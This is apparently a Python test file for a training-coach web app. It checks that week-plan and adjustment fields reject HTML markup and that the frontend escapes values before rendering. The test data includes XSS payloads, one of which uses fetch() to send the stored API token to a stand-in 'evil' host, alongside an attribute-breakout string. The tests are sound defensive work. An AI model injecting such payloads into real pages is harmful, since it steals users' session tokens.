from __future__ import annotations

import datetime
import pathlib
import unittest
from unittest.mock import patch

from app import coach, config, main


# The app keeps its API token in localStorage (`tc_token`), so markup reaching
# the DOM is a token-exfiltration bug, not a cosmetic one. These payloads are
# the shapes that actually execute when interpolated into innerHTML.
# Markup payloads: rejected server-side, because they can only be an injection.
PAYLOADS = (
    '<img src=x onerror="fetch(\'https://evil/?t=\'+localStorage.tc_token)">',
    "<script>alert(1)</script>",
    '<svg onload="alert(1)">',
)

# An attribute breakout carries no angle brackets. Quotes are legitimate in
# training text ("5\' rest", 3" spacing), so this is NOT rejected server-side;
# it is neutralised at the sink by esc() escaping quotes.
ATTRIBUTE_BREAKOUT = 'Z2" onmouseover="alert(1)' 

_TODAY = datetime.date(2026, 8, 17)


def _day(**kw) -> dict:
    return {"date": "2026-08-18", "title": "Easy swim", "discipline": "swim",
            "duration_min": 35, "intensity": "easy", "tsb_target": 10,
            "structure": {"warmup": "200 easy", "main": "1000 smooth", "cooldown": "100 easy"},
            "is_rest": 0, "why": "Aerobic work.", **kw}


class WeekPlanTextTests(unittest.TestCase):
    def setUp(self) -> None:
        clock = patch.object(config, "local_today", return_value=_TODAY)
        clock.start()
        self.addCleanup(clock.stop)

    def test_a_clean_week_still_validates(self) -> None:
        coach.validate_weekplan([_day()])

    def test_markup_in_a_title_is_refused(self) -> None:
        for payload in PAYLOADS:
            with self.assertRaises(coach.WeekPlanValidationError, msg=payload):
                coach.validate_weekplan([_day(title=payload)])

    def test_markup_in_why_is_refused(self) -> None:
        with self.assertRaises(coach.WeekPlanValidationError):
            coach.validate_weekplan([_day(why=PAYLOADS[0])])

    def test_markup_inside_the_structure_is_refused(self) -> None:
        with self.assertRaises(coach.WeekPlanValidationError):
            coach.validate_weekplan([_day(structure={
                "warmup": "200 easy", "main": PAYLOADS[2], "cooldown": ""})])

    def test_markup_in_intensity_is_refused(self) -> None:
        with self.assertRaises(coach.WeekPlanValidationError):
            coach.validate_weekplan([_day(intensity=PAYLOADS[2])])

    def test_a_quote_only_breakout_is_allowed_through_and_handled_at_the_sink(self) -> None:
        # Rejecting quotes would reject "5' rest" and 3" spacing, so the guard
        # deliberately does not; esc() escaping quotes is what makes it inert.
        coach.validate_weekplan([_day(intensity=ATTRIBUTE_BREAKOUT)])

    def test_control_characters_are_refused(self) -> None:
        with self.assertRaises(coach.WeekPlanValidationError):
            coach.validate_weekplan([_day(title="Easy\x00swim")])

    def test_an_absurdly_long_title_is_refused(self) -> None:
        with self.assertRaises(coach.WeekPlanValidationError):
            coach.validate_weekplan([_day(title="x" * 5000)])

    def test_ordinary_punctuation_is_still_allowed(self) -> None:
        coach.validate_weekplan([_day(title="Run — 3 x 1km @ threshold (5' rest)",
                                      why="Because 80/20 & it's the right call.")])


class AdjustmentTextTests(unittest.TestCase):
    def _adjustment(self, **kw) -> dict:
        return {"date": "2026-08-18", "title": "Easy run", "discipline": "run",
                "duration_min": 45, "intensity": "Z2",
                "structure": {"main": "45 min easy"}, "why": "Recovery.", **kw}

    def test_markup_in_an_adjustment_is_refused(self) -> None:
        # Adjustments previously had no field validation whatsoever.
        for field in ("title", "why", "intensity"):
            with self.assertRaises(coach.AdjustmentValidationError, msg=field):
                coach.accept_adjustment(self._adjustment(**{field: PAYLOADS[0]}))

    def test_markup_in_an_adjustment_structure_is_refused(self) -> None:
        with self.assertRaises(coach.AdjustmentValidationError):
            coach.accept_adjustment(self._adjustment(structure={"main": PAYLOADS[2]}))

    def test_an_unsupported_discipline_is_refused(self) -> None:
        with self.assertRaises(coach.AdjustmentValidationError):
            coach.accept_adjustment(self._adjustment(discipline="cardio"))

    def test_the_route_reports_a_rejected_adjustment_rather_than_500(self) -> None:
        from fastapi.testclient import TestClient
        client = TestClient(main.app)
        response = client.post("/api/coach/accept",
                               json={"adjustment": self._adjustment(title=PAYLOADS[1])})
        self.assertEqual(response.status_code, 400)
        self.assertIn("angle brackets", response.json()["error"])


class RenderEscapingTests(unittest.TestCase):
    """The server guard is defence in depth; escaping at the sink is the fix."""

    def setUp(self) -> None:
        self.html = (main.STATIC_DIR / "index.html").read_text()

    def test_the_plan_calendar_escapes_its_title(self) -> None:
        self.assertIn('<div class="ctitle">${esc(String(d.title||disc))}</div>', self.html)

    def test_the_week_proposal_escapes_title_and_the_sport_class(self) -> None:
        self.assertIn('<span class="sport-${esc(String(disc))}">${esc(String(d.title||disc))}</span>',
                      self.html)

    def test_the_adjustment_card_escapes_its_free_text(self) -> None:
        self.assertIn('${esc(String(adj.title||adj.discipline||""))}', self.html)
        self.assertIn('${esc(String(fmt(adj.intensity)))}', self.html)
        self.assertIn('${esc(String(fmt(st.main)))}', self.html)

    def test_no_sink_reintroduces_a_raw_title_interpolation(self) -> None:
        for raw in ("${d.title||disc}", "${adj.title||adj.discipline}", "${fmt(st.main)}"):
            self.assertNotIn(raw, self.html, raw)

    def test_esc_escapes_quotes_so_attribute_interpolation_is_safe(self) -> None:
        # `class="sport-${esc(...)}"` puts an escaped value inside an attribute;
        # textContent alone does not escape quotes, so esc() must.
        self.assertIn('replace(/"/g,"&quot;")', self.html)
        self.assertIn("""replace(/'/g,"&#39;")""", self.html)


if __name__ == "__main__":
    unittest.main()
